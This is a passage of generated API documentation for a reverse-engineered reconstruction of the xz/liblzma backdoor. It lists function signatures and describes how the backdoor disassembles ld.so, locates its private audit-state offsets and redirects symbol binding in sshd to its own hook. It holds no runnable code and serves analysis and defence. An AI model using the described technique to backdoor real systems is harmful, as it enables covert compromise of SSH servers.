<h2 class="memtitle"><span class="permalink"><a href="#a5565761b59b3ef6786b83a9b50f72b17">&#9670;&nbsp;</a></span>fake_lzma_free()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void fake_lzma_free </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>opaque</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>ptr</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>a fake free function called by lzma_free() </p>
<p>this function is a red herring as it is does nothing except make it look like lzma_alloc() is the real deal</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">opaque</td><td>not used </td></tr>
    <tr><td class="paramname">ptr</td><td>not used </td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="a443ee065f54857cd4c559963df5a7b85"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a443ee065f54857cd4c559963df5a7b85">&#9670;&nbsp;</a></span>fd_read()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">ssize_t fd_read </td>
          <td>(</td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>fd</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>buffer</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structlibc__imports.html">libc_imports_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>reads data from the specified file descriptor </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">fd</td><td>the file descriptor to read from </td></tr>
    <tr><td class="paramname">buffer</td><td>the buffer to read data to </td></tr>
    <tr><td class="paramname">count</td><td>number of bytes to read </td></tr>
    <tr><td class="paramname">funcs</td><td>imported libc functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>ssize_t number of bytes read, or -1 on error </dd></dl>

</div>
</div>
<a id="a1c7515ae18e8ded5ffe02d66b9f6bffb"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1c7515ae18e8ded5ffe02d66b9f6bffb">&#9670;&nbsp;</a></span>fd_write()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">ssize_t fd_write </td>
          <td>(</td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>fd</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>buffer</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structlibc__imports.html">libc_imports_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>reads data to the specified file descriptor </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">fd</td><td>the file descriptor to write to </td></tr>
    <tr><td class="paramname">buffer</td><td>data to write </td></tr>
    <tr><td class="paramname">count</td><td>number of bytes to write </td></tr>
    <tr><td class="paramname">funcs</td><td>imported libc functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>ssize_t number of bytes written, or -1 on error </dd></dl>

</div>
</div>
<a id="a683636baae409d1b74ea2c216e2ba107"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a683636baae409d1b74ea2c216e2ba107">&#9670;&nbsp;</a></span>find_add_instruction_with_mem_operand()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_add_instruction_with_mem_operand </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_address</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds an ADD instruction with an immediate memory operand </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
    <tr><td class="paramname">mem_address</td><td>the expected address of the memory access </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ab71f26da9f55365d74279b9835c9b41c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ab71f26da9f55365d74279b9835c9b41c">&#9670;&nbsp;</a></span>find_addr_referenced_in_mov_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* find_addr_referenced_in_mov_instruction </td>
          <td>(</td>
          <td class="paramtype">StringXrefId&#160;</td>
          <td class="paramname"><em>id</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_range_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_range_end</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>find an address referenced in a function </p>
<p>Note: There are some additional requirements on the mov instruction.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">id</td><td>the id of the function to look in </td></tr>
    <tr><td class="paramname">refs</td><td>the string references </td></tr>
    <tr><td class="paramname">mem_range_start</td><td>the start of the range the address lies within </td></tr>
    <tr><td class="paramname">mem_range_end</td><td>the end of the range the address lies within </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>the address referenced if the exepected mov is found, or NULL otherwise </dd></dl>

</div>
</div>
<a id="a41fada894916f4c67d59090ff57aead1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a41fada894916f4c67d59090ff57aead1">&#9670;&nbsp;</a></span>find_call_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_call_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>call_target</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a call instruction </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">call_target</td><td>optional call target address. pass 0 to find any call </td></tr>
    <tr><td class="paramname">dctx</td><td>empty disassembler context to hold the state </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a8847a8cb7f015796a8fbd59cb7a18248"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8847a8cb7f015796a8fbd59cb7a18248">&#9670;&nbsp;</a></span>find_dl_audit_offsets()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_dl_audit_offsets </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">ptrdiff_t *&#160;</td>
          <td class="paramname"><em>libname_offset</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td>
          <td class="paramname"><em>hooks</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find the various offsets in ld.so that need modification to trigger _dl_audit_symbind_alt() to call <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a>. </p>
<p>First, this function finds the location and size of ld.so's _dl_audit_symbind_alt().</p>
<p>This function then calls <a class="el" href="xzre_8h.html#a17824cde912b4de5dd68530dcbf9d42c" title="Find struct link_map offsets required to modify ld.so&#39;s private struct auditstate state.">find_link_map_l_name()</a>, <a class="el" href="xzre_8h.html#a18543737f1eaf3cb1288d0c57c1f0a65" title="Find __rtld_global_ro offsets required to modify ld.so&#39;s private struct audit_ifaces state.">find_dl_naudit()</a> and <a class="el" href="xzre_8h.html#a2d980185c135b2dd9bc69c099ba60c25" title="Find struct link_map offset required to modify ld.so&#39;s private link_map::l_audit_any_plt state.">find_link_map_l_audit_any_plt()</a> to get the various offsets required to modify ld.so's private audit state so that _dl_audit_symbind_alt() will call <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a>.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td></td></tr>
    <tr><td class="paramname">libname_offset</td><td>output of the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored </td></tr>
    <tr><td class="paramname">hooks</td><td></td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a18543737f1eaf3cb1288d0c57c1f0a65"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a18543737f1eaf3cb1288d0c57c1f0a65">&#9670;&nbsp;</a></span>find_dl_naudit()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_dl_naudit </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>dynamic_linker_elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>libcrypto_elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td>
          <td class="paramname"><em>hooks</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find __rtld_global_ro offsets required to modify ld.so's private struct <a class="el" href="structaudit__ifaces.html">audit_ifaces</a> state. </p>
<p>First, this function disassembles ld.so to search for the assert(GLRO(dl_naudit) &lt;= naudit) from _dl_main(). This assert has a LEA instruction with an offset to ld.so's __rtld_global_ro::_dl_naudit.</p>
<p>This function disassembles ld.so's _dl_audit_symbind_alt() to verify it contains a LEA instruction with an offset that matches __rtld_global_ro::_dl_naudit.</p>
<p>This function then sets ldso_ctx::dl_naudit_offset and ldso_ctx::dl_naudit_offset to the offset from the start of __rtld_global_ro to __rtld_global_ro::_dl_naudit and __rtld_global_ro::_dl_audit respectively.</p>
<p>This function also resolves a number of libcrypto function addresses.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">dynamic_linker_elf</td><td>elf_info_t for ld.so </td></tr>
    <tr><td class="paramname">libcrypto_elf</td><td>elf_info_t for libcrypto </td></tr>
    <tr><td class="paramname">hooks</td><td></td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="adb94193174339f9eae22428308d46c33"></a>
<h2 class="memtitle"><span class="permalink"><a href="#adb94193174339f9eae22428308d46c33">&#9670;&nbsp;</a></span>find_function()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_function </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>func_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>func_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>search_base</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">FuncFindType&#160;</td>
          <td class="paramname"><em>find_mode</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>locates the function boundaries. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">func_start</td><td>if provided, will be filled with the function's start address </td></tr>
    <tr><td class="paramname">func_end</td><td>if provided, will be filled with the function's end address </td></tr>
    <tr><td class="paramname">search_base</td><td>lowest search address, where search will be aborted </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">find_mode</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL </dd></dl>

</div>
</div>
<a id="a81a6f3d01ea6057c942052321b92c533"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a81a6f3d01ea6057c942052321b92c533">&#9670;&nbsp;</a></span>find_function_prologue()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_function_prologue </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 **&#160;</td>
          <td class="paramname"><em>output</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">FuncFindType&#160;</td>
          <td class="paramname"><em>find_mode</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>locates the function prologue </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">output</td><td>pointer to receive the resulting prologue address, if found </td></tr>
    <tr><td class="paramname">find_mode</td><td>prologue search mode/strategy </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a60c226501adb1a2d3213484f651ff23b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a60c226501adb1a2d3213484f651ff23b">&#9670;&nbsp;</a></span>find_instruction_with_mem_operand()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_instruction_with_mem_operand </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_address</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a LEA or MOV instruction with an immediate memory operand </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
    <tr><td class="paramname">mem_address</td><td>the address of the memory fetch (where the instruction will fetch from) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if an instruction was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a1c8a36d89bf4e57077a56611e9aeb470"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1c8a36d89bf4e57077a56611e9aeb470">&#9670;&nbsp;</a></span>find_instruction_with_mem_operand_ex()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_instruction_with_mem_operand_ex </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>opcode</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_address</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds an instruction with an immediate memory operand </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
    <tr><td class="paramname">opcode</td><td>opcode to look for, in encoded form (+0x80) </td></tr>
    <tr><td class="paramname">mem_address</td><td>the expected address of the memory access </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aea85a14166f11bb956c7862c2a66571e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aea85a14166f11bb956c7862c2a66571e">&#9670;&nbsp;</a></span>find_lea_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_lea_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>displacement</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a lea instruction </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">displacement</td><td>the memory displacement operand of the target lea instruction </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a6e76946a37fb256974942a542373e421"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6e76946a37fb256974942a542373e421">&#9670;&nbsp;</a></span>find_lea_instruction_with_mem_operand()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_lea_instruction_with_mem_operand </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_address</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a LEA instruction with an immediate memory operand </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
    <tr><td class="paramname">mem_address</td><td>the expected address of the memory access </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a2d980185c135b2dd9bc69c099ba60c25"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2d980185c135b2dd9bc69c099ba60c25">&#9670;&nbsp;</a></span>find_link_map_l_audit_any_plt()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_link_map_l_audit_any_plt </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">ptrdiff_t&#160;</td>
          <td class="paramname"><em>libname_offset</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td>
          <td class="paramname"><em>hooks</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find struct link_map offset required to modify ld.so's private link_map::l_audit_any_plt state. </p>
<p>First, this function disassembles ld.so's _dl_audit_symbind_alt() to search for a MOVZX instruction that fetches the link_map::l_audit_any_plt. The first MOVZ instruction that uses an offset within the range from the start of struct link_map to libname_offset.</p>
<p>This function then calls <a class="el" href="xzre_8h.html#a82817ae0ac4e7e9a7ded04c0fa16ed9c" title="Find the bitmask required to modify ld.so&#39;s private link_map::l_audit_any_plt state.">find_link_map_l_audit_any_plt_bitmask()</a> to get the bitmask required to modify link_map::l_audit_any_plt.</p>
<p>This function also resolves a libc function address.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td></td></tr>
    <tr><td class="paramname">libname_offset</td><td>the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored </td></tr>
    <tr><td class="paramname">hooks</td><td></td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a82817ae0ac4e7e9a7ded04c0fa16ed9c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a82817ae0ac4e7e9a7ded04c0fa16ed9c">&#9670;&nbsp;</a></span>find_link_map_l_audit_any_plt_bitmask()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_link_map_l_audit_any_plt_bitmask </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>search_ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find the bitmask required to modify ld.so's private link_map::l_audit_any_plt state. </p>
<p>First, this function disassembles ld.so's _dl_audit_symbind_alt() to search for a sequence of MOVZ, OR, and TEST instructions that fetch the link_map::l_audit_any_plt.</p>
<p>This function then sets <a class="el" href="structldso__ctx.html#ae3a49e232656fb95fbb2f3f08f579639" title="location of sshd&#39;s link_map::l_audit_any_plt flag">ldso_ctx::sshd_link_map_l_audit_any_plt_addr</a> to the offset to the address of sshd's link_map::l_audit_any_plt flag;</p>
<p>This function also sets ldso_ctx::l_audit_any_plt_bitmask to the bitmask that sets the link_map::l_audit_any_plt flag.</p>
<p>This function also resolves a number of libc and libcrypto function addresses.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td></td></tr>
    <tr><td class="paramname">search_ctx</td><td>the instruction addresses to search as well as the offset and output registers of the instructions to match </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a17824cde912b4de5dd68530dcbf9d42c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a17824cde912b4de5dd68530dcbf9d42c">&#9670;&nbsp;</a></span>find_link_map_l_name()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_link_map_l_name </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *&#160;</td>
          <td class="paramname"><em>data_handle</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">ptrdiff_t *&#160;</td>
          <td class="paramname"><em>libname_offset</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
